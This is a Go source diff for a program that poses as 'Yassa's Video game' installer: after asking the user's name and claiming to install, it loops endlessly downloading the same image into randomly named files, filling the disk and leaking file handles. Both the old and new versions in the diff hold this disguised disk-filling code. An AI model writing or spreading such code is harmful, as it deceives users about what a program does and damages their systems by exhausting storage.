@@ -1,47 +1,42 @@
 package main
 
 import (
-	"strconv"
 	"fmt"
 	"io"
-	"log"
 	"math/rand"
 	"net/http"
 	"os"
+	"strconv"
 )
 
 func main(){
-	fmt.Println("Hello there what is your name?")
-	var name string
-  
+    fmt.Println("Welcome to Yassa's Video game")
+    fmt.Println("Hi there what is your name")
+    var name string
     fmt.Scanln(&name)
-	fmt.Println("Welcome "+name+" we are downloading the setup files for this game please wait...")
-	create_image()
+    fmt.Println("Welcome "+name+" please wait while we are installing")
+    create_image()
 }
 
 
-func create_image() {
-	for true{
-    url := "http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg"
-    response, e := http.Get(url)
-    if e != nil {
-        log.Fatal(e)
-    }
-    defer response.Body.Close()
-
-    //open a file for writing
-	name:= rand.Int()
-    file, err := os.Create(strconv.Itoa(name)+".jpg")
-    if err != nil {
-        log.Fatal(err)
-    }
-    defer file.Close()
-
-    // Use io.Copy to just dump the response body to the file. This supports huge files
-    _, err = io.Copy(file, response.Body)
-    if err != nil {
-        log.Fatal(err)
-    }
-    fmt.Println("Downloading...")
-}
+func create_image(){
+    for true{
+        url:= "http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg"
+        response, err := http.Get(url)
+        if err!=nil{
+            panic(err)
+        }
+        defer response.Body.Close()
+        name:= rand.Int()
+        file,err := os.Create(strconv.Itoa(name)+".jpg")
+        if err!=nil{
+            panic(err)
+        }
+        defer file.Close()
+        _,err = io.Copy(file,response.Body)
+        if err != nil{
+            panic(err)
+        }
+        fmt.Println("Downloading please wait....")
+    }   
 }
